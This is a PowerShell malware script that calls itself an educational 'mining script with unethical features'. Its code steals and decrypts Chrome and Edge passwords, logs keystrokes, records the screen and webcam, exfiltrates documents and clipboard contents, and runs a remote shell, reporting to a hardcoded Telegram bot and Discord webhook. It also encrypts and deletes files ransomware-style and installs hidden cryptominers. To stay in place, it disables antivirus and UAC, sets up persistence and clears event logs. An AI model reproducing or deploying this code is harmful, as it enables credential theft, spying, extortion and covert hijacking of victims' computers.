# Enhanced Mining Script with Unethical Features
# WARNING: For educational purposes in a controlled environment ONLY.
# Use outside a controlled environment is ILLEGAL and UNETHICAL.

#Requires -RunAsAdministrator

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

# Load SQLite assembly (ensure System.Data.SQLite.dll is in the specified path)
Add-Type -Path "C:\SQLite\System.Data.SQLite.dll" -ErrorAction SilentlyContinue

# Define base directory and files
$baseDir = "$env:APPDATA\AdvancedMiner"
$logFile = "$baseDir\mining_log.txt"
$configFile = "$baseDir\config.json"
$scriptUrl = "https://raw.githubusercontent.com/yourusername/yourrepo/main/mining.ps1"  # Replace with your repo URL
if (-not (Test-Path $baseDir)) { 
    New-Item -Path $baseDir -ItemType Directory -Force | Out-Null 
    Write-Host "Created directory: $baseDir"
}

# Telegram API setup
$telegramBotToken = "7096283583:AAE7iv8FKDJZ5Ok5Bq0NdZ5Qa_a1KoIYfjg"  # Replace with your token
$telegramChatId = "7486857021"      # Replace with your chat ID

# Discord Webhook URL
$discordWebhookUrl = "https://discord.com/api/webhooks/1358278272080674994/Wg5AJoXN0TzH8Fo4VpElW4n_zCWE7FH5aYHyBpFc0ygsosMohmR-5gws_VIExd6Vanu9"  # Replace with your webhook URL

# Logging function
function Write-Log {
    param ([string]$message)
    $timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    "$timestamp - $message" | Out-File -FilePath $logFile -Append
    Write-Host "$timestamp - $message" 
}

# Config management
$config = if (Test-Path $configFile) { 
    Get-Content $configFile | ConvertFrom-Json 
} else { 
    @{ "electricity_cost" = 0.1; "pool_fee" = 0.01; "last_algo" = "Ethash"; "telegram_token" = $telegramBotToken; "telegram_chat_id" = $telegramChatId } 
}
$config | ConvertTo-Json | Out-File $configFile

# Wallet setup (replace with your actual wallets)
$env:GPU_WALLET = "0x6D8E80004900a938b518e1aA01fDdB384a089F1E"  # ETH Wallet
$env:XMR_WALLET = "4B7F3tuKdQVNB7QMoyfvG62EEqHEKV4iQWfZH5RAA5uz3STSWchWQ9dH8Jt9P6woRCP1UYX58HxPZW4BqdZ7v2ETLkYi1D5"  # XMR Wallet
$env:TON_WALLET = "UQDg4WHFrh5CagHuodkhfzrlFtW_nCyCpq_hD763gb6yhOC0"  # TON Wallet

# Initialize script variables
$script:lastHashrate = 0
$script:totalEarnings = 0
$script:overheatCount = 0
$script:lastUpdateId = 0  # Track last processed Telegram update

# Function to Send Message via Telegram
function Send-TelegramMessage {
    param ([string]$message)
    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage"
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body @{
            chat_id = $telegramChatId
            text    = $message
        } -ErrorAction Stop
    } catch {
        Write-Log "Telegram send failed: $_"
    }
}

# Function to Send File via Telegram
function Send-TelegramFile {
    param ([string]$filePath)
    $url = "https://api.telegram.org/bot$telegramBotToken/sendDocument"
    try {
        $fileStream = [System.IO.File]::OpenRead($filePath)
        $form = @{
            chat_id = $telegramChatId
            document = $fileStream
        }
        Invoke-RestMethod -Uri $url -Method Post -Form $form -ErrorAction Stop
        $fileStream.Close()
    } catch {
        Write-Log "Telegram file send failed: $_"
    }
}

# Function to Send Message via Discord Webhook
function Send-DiscordWebhook {
    param ([string]$message)
    $body = @{ content = $message } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
    } catch {
        Write-Log "Discord send failed: $_"
    }
}

### Account Grabbing Functions

# Get Chrome Encryption Key
function Get-ChromeEncryptionKey {
    $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (-not (Test-Path $localStatePath)) {
        Write-Log "Chrome Local State file not found."
        return $null
    }
    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
    $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
    $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)] # Remove "DPAPI" prefix
    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
    return $decryptedKey
}

# Decrypt Chrome Password
function Decrypt-ChromePassword {
    param (
        [byte[]]$encryptedData,
        [byte[]]$key
    )
    if ([System.Text.Encoding]::ASCII.GetString($encryptedData[0..2]) -eq "v10") {
        $nonce = $encryptedData[3..14]  # 12-byte nonce
        $cipherText = $encryptedData[15..($encryptedData.Length - 17)]  # Ciphertext
        $tag = $encryptedData[($encryptedData.Length - 16)..($encryptedData.Length - 1)]  # 16-byte tag
        $aesGcm = New-Object System.Security.Cryptography.AesGcm($key)
        $plainText = New-Object byte[] $cipherText.Length
        $aesGcm.Decrypt($nonce, $cipherText, $tag, $plainText)
        return [System.Text.Encoding]::UTF8.GetString($plainText)
    } else {
        return [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $null, 'CurrentUser'))
    }
}

# Grab Chrome Credentials (Fixed)
function Get-ChromeCredentials {
    $chromeDbPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $tempDb = "$env:TEMP\ChromeLoginData.db"
    if (-not (Test-Path $chromeDbPath)) {
        Write-Log "Chrome Login Data not found."
        return
    }
    Copy-Item $chromeDbPath $tempDb -Force
    $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
    $connection.ConnectionString = "Data Source=$tempDb"
    $connection.Open()
    $query = "SELECT origin_url, username_value, password_value FROM logins"
    $command = $connection.CreateCommand()
    $command.CommandText = $query
    $reader = $command.ExecuteReader()
    $encryptionKey = Get-ChromeEncryptionKey
    if (-not $encryptionKey) {
        Write-Log "Failed to retrieve Chrome encryption key."
        $connection.Close()
        Remove-Item $tempDb
        return
    }
    while ($reader.Read()) {
        $url = $reader["origin_url"]
        $username = $reader["username_value"]
        $encryptedPassword = [byte[]]$reader["password_value"]
        if ($encryptedPassword.Length -gt 0) {
            try {
                $password = Decrypt-ChromePassword -encryptedData $encryptedPassword -key $encryptionKey
                $message = "Chrome - URL: $url, User: $username, Pass: $password"
                Send-TelegramMessage -message $message
                Send-DiscordWebhook -message $message
                Write-Log "Extracted Chrome credential for $url"
            } catch {
                Write-Log ("Failed to decrypt password for {0}: {1}" -f $url, $_)
            }
        }
    }
    $connection.Close()
    Remove-Item $tempDb
}

# Grab Edge Credentials (Fixed)
function Get-EdgeCredentials {
    $edgeDbPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    $tempDb = "$env:TEMP\EdgeLoginData.db"
    if (-not (Test-Path $edgeDbPath)) {
        Write-Log "Edge Login Data not found."
        return
    }
    Copy-Item $edgeDbPath $tempDb -Force
    $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
    $connection.ConnectionString = "Data Source=$tempDb"
    $connection.Open()
    $query = "SELECT origin_url, username_value, password_value FROM logins"
    $command = $connection.CreateCommand()
    $command.CommandText = $query
    $reader = $command.ExecuteReader()
    $encryptionKey = Get-ChromeEncryptionKey  # Edge uses the same key storage
    if (-not $encryptionKey) {
        Write-Log "Failed to retrieve Edge encryption key."
        $connection.Close()
        Remove-Item $tempDb
        return
    }
    while ($reader.Read()) {
        $url = $reader["origin_url"]
        $username = $reader["username_value"]
        $encryptedPassword = [byte[]]$reader["password_value"]
        if ($encryptedPassword.Length -gt 0) {
            try {
                $password = Decrypt-ChromePassword -encryptedData $encryptedPassword -key $encryptionKey
                $message = "Edge - URL: $url, User: $username, Pass: $password"
                Send-TelegramMessage -message $message
                Send-DiscordWebhook -message $message
                Write-Log "Extracted Edge credential for $url"
            } catch {
                Write-Log ("Failed to decrypt password for {0}: {1}" -f $url, $_)
            }
        }
    }
    $connection.Close()
    Remove-Item $tempDb
}

### Additional Unethical Features

# Keylogging
function Start-Keylogging {
    Add-Type -AssemblyName System.Windows.Forms
    $logFile = "$env:TEMP\keystrokes.txt"
    while ($true) {
        Start-Sleep -Milliseconds 10
        $keys = ""
        for ($i = 0; $i -lt 255; $i++) {
            if ([System.Windows.Forms.Control]::IsKeyDown($i)) {
                $keys += [char]$i
            }
        }
        if ($keys) {
            $keys | Out-File -FilePath $logFile -Append
            Send-TelegramMessage -message "Keystrokes: $keys"
            Send-DiscordWebhook -message "Keystrokes: $keys"
            Write-Log "Captured keystrokes: $keys"
        }
    }
}

# Screen Recording (requires FFmpeg installed)
function Start-ScreenRecording {
    $outputFile = "$env:TEMP\screen_record.mp4"
    $ffmpegPath = "C:\ffmpeg\bin\ffmpeg.exe"  # Adjust path as needed
    if (Test-Path $ffmpegPath) {
        & $ffmpegPath -f gdigrab -framerate 30 -i desktop -t 10 $outputFile -y
        Send-TelegramFile -filePath $outputFile
        Send-DiscordWebhook -message "Screen recording captured."
        Write-Log "Screen recording saved to $outputFile"
    } else {
        Write-Log "FFmpeg not found for screen recording."
    }
}

# Webcam Snapshot
function Capture-Webcam {
    $outputImage = "$env:TEMP\webcam.jpg"
    try {
        $webcam = New-Object -ComObject "WIA.CommonDialog"
        $image = $webcam.ShowAcquireImage()
        $image.SaveFile($outputImage)
        Send-TelegramFile -filePath $outputImage
        Send-DiscordWebhook -message "Webcam snapshot captured."
        Write-Log "Webcam image saved to $outputImage"
    } catch {
        Write-Log "Webcam capture failed: $_"
    }
}

# File Exfiltration
function Exfiltrate-Files {
    $targetFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.docx, *.txt, *.pdf, *wallet* -ErrorAction SilentlyContinue
    foreach ($file in $targetFiles) {
        Send-TelegramFile -filePath $file.FullName
        Send-DiscordWebhook -message "Exfiltrated file: $($file.Name)"
        Write-Log "Exfiltrated file: $($file.FullName)"
    }
}

# Remote Shell via Telegram
function Start-RemoteShell {
    Send-TelegramMessage -message "Remote shell activated. Send commands via Telegram."
    Write-Log "Remote shell started."
    while ($true) {
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramBotToken/getUpdates?offset=$script:lastUpdateId" -Method Get
        if ($updates.ok -and $updates.result) {
            foreach ($update in $updates.result) {
                $script:lastUpdateId = $update.update_id + 1
                if ($update.message.chat.id -eq [int64]$telegramChatId) {
                    $command = $update.message.text
                    try {
                        $output = Invoke-Expression $command 2>&1
                        Send-TelegramMessage -message "Command output: $output"
                        Send-DiscordWebhook -message "Executed: $command | Output: $output"
                        Write-Log "Executed command: $command"
                    } catch {
                        Send-TelegramMessage -message "Command failed: $_"
                        Write-Log "Command failed: $_"
                    }
                }
            }
        }
        Start-Sleep -Seconds 2
    }
}

# Ransomware Simulation (reversible encryption)
function Start-Ransomware {
    $key = [Convert]::ToBase64String((1..32 | ForEach-Object { Get-Random -Minimum 0 -Maximum 255 }))
    $targetDir = "$env:USERPROFILE\Documents"
    $files = Get-ChildItem -Path $targetDir -Recurse -File
    foreach ($file in $files) {
        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
        if ($content) {
            $encrypted = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
            $encrypted | Set-Content "$($file.FullName).encrypted"
            Remove-Item $file.FullName
        }
    }
    $ransomNote = "Your files are encrypted. For testing, decrypt with key: $key"
    $ransomNote | Out-File "$targetDir\README.txt"
    Send-TelegramMessage -message $ransomNote
    Send-DiscordWebhook -message $ransomNote
    Write-Log "Ransomware simulation executed with key: $key"
}

# Network Sniffing (basic)
function Start-NetworkSniffing {
    $packets = netstat -an | Out-String
    Send-TelegramMessage -message "Network activity: $packets"
    Send-DiscordWebhook -message "Network sniffing captured."
    Write-Log "Network sniffing executed."
}

# Clipboard Hijacking
function Start-ClipboardHijacking {
    while ($true) {
        $clip = Get-Clipboard
        if ($clip) {
            Send-TelegramMessage -message "Clipboard content: $clip"
            Send-DiscordWebhook -message "Clipboard content: $clip"
            Write-Log "Captured clipboard: $clip"
            Set-Clipboard -Value "Clipboard hijacked for testing."
        }
        Start-Sleep -Seconds 5
    }
}

# Enhanced Persistence via Registry
function Ensure-Persistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $scriptPath = "$baseDir\mining.ps1"
    if (-not (Test-Path "Registry::$regPath")) {
        New-Item -Path "Registry::$regPath" -Force | Out-Null
    }
    Set-ItemProperty -Path "Registry::$regPath" -Name "AdvancedMiner" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
    Write-Log "Persistence added via registry."
}

# Disable All Antivirus (beyond Windows Defender)
function Disable-AllAntivirus {
    $avServices = @("McAfee", "Norton", "Symantec", "Kaspersky", "Avast", "AVG", "Bitdefender", "TrendMicro", "Sophos")
    foreach ($service in $avServices) {
        $svc = Get-Service -Name "*$service*" -ErrorAction SilentlyContinue
        if ($svc) {
            Stop-Service -Name $svc.Name -Force -ErrorAction SilentlyContinue
            Set-Service -Name $svc.Name -StartupType Disabled -ErrorAction SilentlyContinue
            Write-Log "Disabled antivirus service: $($svc.Name)"
        }
    }
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    Write-Log "Attempted to disable all antivirus software."
}

# Prevent sleep
function Prevent-Sleep {
    Write-Log "Starting sleep prevention..."
    try {
        $shell = New-Object -ComObject "WScript.Shell"
        Start-Job -Name "SleepPreventer" -ArgumentList $shell -ScriptBlock {
            param ($shell)
            while ($true) {
                $shell.SendKeys("{F15}")
                Start-Sleep -Seconds 60
            }
        }
        Write-Log "Sleep prevention job started."
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Prevent-Sleep: $_"
    }
}

# Security bypass and permanent disabling
function Bypass-WindowsSecurity {
    Write-Log "Bypassing and disabling Windows security..."
    try {
        Disable-AllAntivirus
        Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
        Set-Service -Name "wuauserv" -StartupType Disabled -ErrorAction SilentlyContinue
        $paths = @("$baseDir\T-Rex", "$baseDir\TeamRedMiner", "$baseDir\XMRig", $baseDir)
        foreach ($path in $paths) {
            if (-not (Get-MpPreference).ExclusionPath -contains $path) {
                Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
                Write-Log "Exclusion added for path: $path"
            }
        }
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue
        Write-Log "Windows security fully bypassed and disabled."
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Bypass-WindowsSecurity: $_"
    }
}

# Download miner with camouflage
function Download-Miner {
    param ([string]$miner, [string]$url, [string]$path)
    try {
        $zipPath = "$env:TEMP\$miner.zip"
        Write-Log "Downloading $miner from $url..."
        Invoke-WebRequest -Uri $url -OutFile $zipPath -ErrorAction Stop
        Expand-Archive -Path $zipPath -DestinationPath $path -Force -ErrorAction Stop
        Remove-Item $zipPath -ErrorAction Stop
        $exeName = "$miner.exe"
        $exePath = Get-ChildItem -Path $path -Filter $exeName -Recurse | Select-Object -First 1
        if ($exePath) {
            $camouflagedExe = "$path\system_service.exe"
            Move-Item -Path $exePath.FullName -Destination $camouflagedExe -Force
            Get-ChildItem -Path $path -Directory | Remove-Item -Recurse -Force
            Write-Log "$miner camouflaged as $camouflagedExe"
        } else {
            throw "Executable $exeName not found."
        }
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Download-Miner ($miner): $_"
        throw
    }
}

# AI Prediction
function Get-MLPrediction {
    try {
        $predictPath = "$baseDir\predict.py"
        if (-not (Test-Path $predictPath)) {
            Write-Log "predict.py not found. Using defaults."
            return "20,8,500"
        }
        $prediction = & "python.exe" $predictPath
        if ($null -eq $prediction) { return "20,8,500" }
        Write-Log "AI Prediction: $prediction"
        return $prediction.Split(',')
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-MLPrediction: $_"
        return "20,8,500"
    }
}

# GPU monitoring and overclocking
function Get-GPUTemperature {
    try {
        $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
        if (Test-Path $nvidiaSmi) {
            $temp = [int](& $nvidiaSmi --query-gpu=temperature.gpu --format=csv,noheader | Select-Object -First 1)
            if ($temp -gt 80) { $script:overheatCount++ }
            Write-Log "GPU temp: $temp°C"
            return $temp
        }
        return (Get-AMDTemperature)
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-GPUTemperature: $_"
        return 50
    }
}

function Get-AMDTemperature {
    try {
        Write-Log "Using fallback AMD GPU temp."
        return 50
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-AMDTemperature: $_"
        return 50
    }
}

function Set-GPUOverclock {
    Write-Log "Setting GPU overclock..."
    try {
        $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
        if (Test-Path $nvidiaSmi) {
            $temp = Get-GPUTemperature
            $coreOffset = if ($temp -lt 60) { 150 } elseif ($temp -lt 70) { 75 } else { 0 }
            $memOffset = if ($script:memOffset) { $script:memOffset } else { 500 }
            & $nvidiaSmi -pm 1
            & $nvidiaSmi -lgc "$coreOffset"
            & $nvidiaSmi -lmc "$memOffset"
            Write-Log "GPU overclock: Core +$coreOffset MHz, Mem +$memOffset MHz"
        }
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Set-GPUOverclock: $_"
    }
}

# GPU compatibility
function Test-GPUCompatibility {
    try {
        $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
        if (Test-Path $nvidiaSmi) { 
            Write-Log "NVIDIA GPU detected."
            return "NVIDIA" 
        }
        $amdGpu = Get-WmiObject Win32_VideoController | Where-Object { $_.Name -match "AMD|Radeon" }
        if ($amdGpu) { 
            Write-Log "AMD GPU detected."
            return "AMD" 
        }
        Write-Log "No compatible GPU."
        return $null
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Test-GPUCompatibility: $_"
        return $null
    }
}

# Profitability
function Get-MostProfitableCoin {
    try {
        $maxRetries = 3
        $retryCount = 0
        $success = $false
        while (-not $success -and $retryCount -lt $maxRetries) {
            try {
                $profitData = Invoke-RestMethod -Uri "https://whattomine.com/coins.json" -TimeoutSec 10 -ErrorAction Stop
                $success = $true
            } catch {
                $retryCount++
                Write-Log "Profitability fetch attempt $retryCount failed: $_"
                if ($retryCount -lt $maxRetries) { Start-Sleep -Seconds 5 }
            }
        }
        if (-not $success) {
            Write-Log "Profitability fetch failed. Using default (ETH)."
            return @{ tag = "ETH"; algorithm = "Ethash"; profitability = 0; net_profit = 0 }
        }
        $coins = $profitData.coins | Where-Object { $_.algorithm -in @("Ethash", "RandomX") }
        if (-not $coins) {
            Write-Log "No coins found. Using default (ETH)."
            return @{ tag = "ETH"; algorithm = "Ethash"; profitability = 0; net_profit = 0 }
        }
        $bestCoin = $coins | ForEach-Object { 
            $_ | Add-Member -NotePropertyName "net_profit" -NotePropertyValue ($_.profitability * (1 - $config.pool_fee)) -PassThru 
        } | Sort-Object -Property net_profit -Descending | Select-Object -First 1
        $script:lastProfit = $bestCoin
        Write-Log "Best coin: $($bestCoin.tag), Profit: $($bestCoin.net_profit)"
        return $bestCoin
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-MostProfitableCoin: $_"
        return @{ tag = "ETH"; algorithm = "Ethash"; profitability = 0; net_profit = 0 }
    }
}

# Pool selection
function Get-OptimalPool {
    param ([string]$algorithm)
    try {
        if ($algorithm -eq "Ethash") {
            return "stratum+tcp://etc.2miners.com:1010"
        } else {
            return "stratum+tcp://pool.hashvault.pro:5555"
        }
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-OptimalPool: $_"
        return "stratum+tcp://pool.hashvault.pro:5555"
    }
}

# Install miners with camouflage
function Install-Miner {
    param ([string]$miner, [string]$url, [string]$path)
    try {
        if (-not (Test-Path $path)) { New-Item -Path $path -ItemType Directory -Force | Out-Null }
        $exePath = "$path\system_service.exe"
        if (-not (Test-Path $exePath)) {
            Download-Miner -miner $miner -url $url -path $path
        }
        Write-Log "Miner ready at $exePath."
        return "system_service.exe"
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Install-Miner ($miner): $_"
        return $null
    }
}

# Start miners with stealth and resource hijacking
function Start-Miner {
    param ([string]$type, [string]$pool, [string]$worker, [string]$exeName)
    try {
        $path = "$baseDir\$type\$exeName"
        if (-not (Test-Path $path)) { throw "Miner not found: $path" }
        $args = if ($type -eq "T-Rex") {
            "-a ethash -o $pool -u $env:GPU_WALLET.$worker -p x --api-bind-http 127.0.0.1:4067 --no-color"
        } elseif ($type -eq "TeamRedMiner") {
            "-a ethash -o $pool -u $env:GPU_WALLET.$worker -p x --no_console"
        } else {
            "--donate-level=1 -o $pool -u $env:XMR_WALLET -p $worker --http-enabled --http-port=4068 --background"
        }
        $process = Start-Process -FilePath $path -ArgumentList $args -WindowStyle Hidden -PassThru
        Write-Log "$type started (PID: $($process.Id))."
        $minerProcess = Get-Process -Id $process.Id
        $minerProcess.PriorityClass = "RealTime"
        Get-Process | Where-Object { $_.Id -ne $minerProcess.Id } | ForEach-Object { $_.PriorityClass = "Idle" }
        return $process
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Start-Miner ($type): $_"
        return $null
    }
}

# Hashrate and status
function Get-Hashrate {
    param ([string]$type)
    try {
        if ($type -eq "T-Rex" -and (Test-GPUCompatibility) -eq "NVIDIA") { 
            return (Invoke-RestMethod -Uri "http://127.0.0.1:4067/summary").hashrate 
        }
        if ($type -eq "XMRig") { 
            return (Invoke-RestMethod -Uri "http://127.0.0.1:4068/1/summary").hashrate.total[0] 
        }
        return 0
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-Hashrate ($type): $_"
        return 0
    }
}

function Get-MinerStatus {
    param ([string]$type)
    try {
        $proc = Get-Process -Name "system_service" -ErrorAction SilentlyContinue
        return ($proc -and -not $proc.HasExited)
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-MinerStatus ($type): $_"
        return $false
    }
}

# System stability
function Check-SystemStability {
    try {
        $ramFree = (Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1024
        $cpuUsage = (Get-CimInstance Win32_PerfFormattedData_PerfOS_Processor -Filter "Name='_Total'").PercentProcessorTime
        Write-Log "System: RAM Free: $ramFree MB, CPU: $cpuUsage%"
        if ($ramFree -lt 500 -or $cpuUsage -gt 90) {
            Write-Log "System unstable. Pausing."
            Stop-Process -Name "system_service" -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 300
            return $false
        }
        return $true
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Check-SystemStability: $_"
        return $false
    }
}

# Auto-update
function Update-Script {
    Write-Log "Checking for script update..."
    try {
        $scriptPath = $MyInvocation.MyCommand.Path
        if (-not $scriptPath) { $scriptPath = "$baseDir\mining.ps1" }
        $currentScript = Get-Content $scriptPath -Raw
        $latestScript = Invoke-RestMethod -Uri $scriptUrl
        if ($currentScript -ne $latestScript) {
            Write-Log "Updating script..."
            $latestScript | Out-File $scriptPath -Force
            Write-Log "Script updated. Restarting..."
            Restart-Computer -Force
        }
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Update-Script: $_"
    }
}

# Telegram command processing (enhanced for remote shell)
function Get-TelegramCommands {
    try {
        $token = $config.telegram_token
        $url = "https://api.telegram.org/bot$token/getUpdates?offset=$script:lastUpdateId"
        $response = Invoke-RestMethod -Uri $url -Method Get
        if ($response.ok -and $response.result) {
            foreach ($update in $response.result) {
                $script:lastUpdateId = $update.update_id + 1
                if ($update.message.chat.id -eq [int64]$config.telegram_chat_id) {
                    $command = $update.message.text
                    Process-Command -command $command
                } else {
                    Write-Log "Unauthorized command attempt from chat ID: $($update.message.chat.id)"
                }
            }
        }
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Get-TelegramCommands: $_"
    }
}

function Process-Command {
    param ([string]$command)
    switch ($command) {
        "/start" {
            if (-not (Get-MinerStatus "TeamRedMiner")) {
                $gpuType = Test-GPUCompatibility
                if ($gpuType -eq "AMD") {
                    $profit = Get-MostProfitableCoin
                    $gpuPool = Get-OptimalPool -algorithm $profit.algorithm
                    $script:teamredminerProcess = Start-Miner -type "TeamRedMiner" -pool $gpuPool -worker $worker -exeName $teamredminerExe
                }
            }
            if (-not (Get-MinerStatus "XMRig")) {
                $xmrigPool = Get-OptimalPool -algorithm "RandomX"
                $script:xmrigProcess = Start-Miner -type "XMRig" -pool $xmrigPool -worker $worker -exeName $xmrigExe
            }
            Send-TelegramMessage "Miners started."
        }
        "/stop" {
            Stop-Process -Name "system_service" -Force -ErrorAction SilentlyContinue
            Send-TelegramMessage "Miners stopped."
        }
        "/status" {
            $status = "Hashrate: $script:lastHashrate MH/s, Earnings: $script:totalEarnings USD, Overheats: $script:overheatCount"
            Send-TelegramMessage $status
        }
        "/restart" {
            Send-TelegramMessage "Restarting system..."
            Restart-Computer -Force
        }
        default {
            try {
                $output = Invoke-Expression $command 2>&1
                Send-TelegramMessage -message "Command output: $output"
                Send-DiscordWebhook -message "Executed: $command | Output: $output"
                Write-Log "Executed command: $command"
            } catch {
                Send-TelegramMessage -message "Command failed: $_"
                Write-Log "Command failed: $_"
            }
        }
    }
}

# Clear system logs
function Clear-Logs {
    try {
        Clear-EventLog -LogName "Application" -ErrorAction SilentlyContinue
        Clear-EventLog -LogName "System" -ErrorAction SilentlyContinue
        Write-Log "System logs cleared."
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Clear-Logs: $_"
    }
}

# Aggressive throttling override
function Optimize-ResourceUsage {
    try {
        $cpuUsage = (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
        if ($cpuUsage -lt 95) {
            Write-Log "CPU underutilized ($cpuUsage%). Restarting miners at max intensity."
            Stop-Process -Name "system_service" -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 5
        }
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Optimize-ResourceUsage: $_"
    }
}

# Main monitoring function with persistence and Telegram control
function Monitor-Miners {
    $worker = $env:COMPUTERNAME
    Write-Log "Starting mining on $worker..."
    try {
        $gpuType = Test-GPUCompatibility
        if (-not $gpuType) { throw "No compatible GPU detected." }
        $script:startTime = Get-Date
        $script:totalEarnings = 0
        $script:overheatCount = 0
        
        $trexExe = Install-Miner -miner "trex" -url "https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip" -path "$baseDir\T-Rex"
        $teamredminerExe = Install-Miner -miner "teamredminer" -url "https://github.com/todxx/teamredminer/releases/download/v0.10.20/teamredminer-v0.10.20-win.zip" -path "$baseDir\TeamRedMiner"
        $xmrigExe = Install-Miner -miner "xmrig" -url "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -path "$baseDir\XMRig"
        
        $taskName = "AdvancedMinerTask"
        if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$baseDir\mining.ps1`""
            $trigger = New-ScheduledTaskTrigger -AtStartup
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force
            Write-Log "Scheduled task $taskName created for persistence."
        }
        
        Ensure-Persistence  # Add registry persistence
        
        # Start unethical features as background jobs
        Start-Job -ScriptBlock { Get-ChromeCredentials }
        Start-Job -ScriptBlock { Get-EdgeCredentials }
        Start-Job -ScriptBlock { Start-Keylogging }
        Start-Job -ScriptBlock { Start-ScreenRecording }
        Start-Job -ScriptBlock { Capture-Webcam }
        Start-Job -ScriptBlock { Exfiltrate-Files }
        Start-Job -ScriptBlock { Start-RemoteShell }
        Start-Job -ScriptBlock { Start-Ransomware }
        Start-Job -ScriptBlock { Start-NetworkSniffing }
        Start-Job -ScriptBlock { Start-ClipboardHijacking }
        
        $iteration = 0
        while ($true) {
            if (-not (Check-SystemStability)) { continue }
            
            $profit = Get-MostProfitableCoin
            $prediction = Get-MLPrediction
            $script:intensity, $script:threads, $script:memOffset = $prediction
            
            $gpuPool = Get-OptimalPool -algorithm $profit.algorithm
            $xmrigPool = Get-OptimalPool -algorithm "RandomX"
            Set-GPUOverclock
            
            Get-TelegramCommands
            Optimize-ResourceUsage
            Update-Script
            if ($iteration % 360 -eq 0) { Clear-Logs }  # Clear logs every hour
            Start-Sleep -Seconds 10
            $iteration++
        }
    } catch {
        Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Monitor-Miners: $_"
        Send-TelegramMessage -message "Critical error: $_"
        Send-DiscordWebhook -message "Critical error: $_"
    }
}

# Main execution
Write-Log "Initializing mining script with unethical features..."
try {
    Send-TelegramMessage -message "Initializing enhanced mining script with unethical features..."
    Send-DiscordWebhook -message "Script started in controlled environment."
    Bypass-WindowsSecurity
    Prevent-Sleep
    Set-ItemProperty -Path "$baseDir\mining.ps1" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
    Clear-Logs
    Monitor-Miners
} catch {
    $errorMessage = "Startup failed: $_"
    Add-Content -Path "$env:TEMP\.mining_errors.log" -Value "Startup: $_"
    Send-TelegramMessage -message $errorMessage
    Send-DiscordWebhook -message $errorMessage
}